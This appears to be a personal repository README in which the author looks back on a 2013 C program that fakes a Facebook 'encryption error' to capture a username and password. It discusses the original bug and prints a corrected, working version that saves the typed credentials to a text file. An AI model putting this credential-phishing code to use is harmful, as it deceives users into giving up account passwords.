# Facebook

A super high tech attempt at phishing... as long as your victim only uses facebook.com through the command line

### Files: 
| Filename | Contents | Last Modified |
|----------|------|---------------|
|`facebook.c`| C Source File | 2013-09-27 7:09 PM 
| `facebook.exe`| Executable | 2013-09-27 7:01 PM
|`FACEBOOK.TXT`| Binary | 2013-09-27 7:03 PM

## `facebook.c`

This file gave me a chuckle while reading it. It's from right around where I started taking interest in
cybersecurity. Let's just say I was looking to be mischevious.

It's pretty simple. I created a file descriptor `fp` to output to the innocuous `FACEBOOK.TXT` file.
Then, it prompts the user for a user name and password. In theory, the program outputs the username
and password strings to the file. However, for some reason I used `%c` in my `fprintf` format strings
instead of `%s`. This meant that the last byte portion of the pointer to the string was written to the file.

This means in reality, `FACEBOOK.TXT` was supposed to be a text file, but since I didn't know what `%s` did,
the program would only put two bytes separated by a new line in the file.

I also thought I had to escape opening parenthesis `(` in strings, but not closing parenthesis `)` for some
reason.

### Fixed version

```C
#include <stdio.h>
#include <stdlib.h>

int main()
{
  FILE *fp;
  char user[50];
  char pass[50];

  fp = fopen("FACEBOOK.TXT","w");

  printf("ATTENTION:\nDue to an encryption error please re-enter the following credentials:\n");
  printf("User name/password for: www.facebook.com (173.252.110.27)\n");
	
  printf("User name: ");
  fgets ( user, 50, stdin );
  fprintf(fp, "%s\n", user);
	
  printf("Password: ");
  fgets ( pass, 50, stdin );
  fprintf(fp,"%s\n", pass);

  printf("confirming...\n");

  fclose(fp);
	
  return 0;
}
```
